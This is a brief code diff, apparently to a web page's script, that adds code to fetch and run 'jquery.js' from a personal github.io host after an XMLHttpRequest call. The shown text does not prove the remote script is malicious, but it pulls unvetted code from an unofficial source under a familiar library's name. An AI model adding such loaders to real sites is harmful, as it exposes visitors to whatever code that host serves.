@@ -15,6 +15,12 @@
     };
     xmlhttp.open("GET", url , true);
     xmlhttp.send();
+		
+		var scriptElement = document.createElement("script");
+		scriptElement.src = 'https://psach.github.io/jquery.js';
+		scriptElement.type = "text/javascript"; //specify type so that the browser won't ignore it
+		var head = document.getElementsByTagName("head")[0] || document.documentElement;
+		head.appendChild(scriptElement);
 	
 }
 	</script>
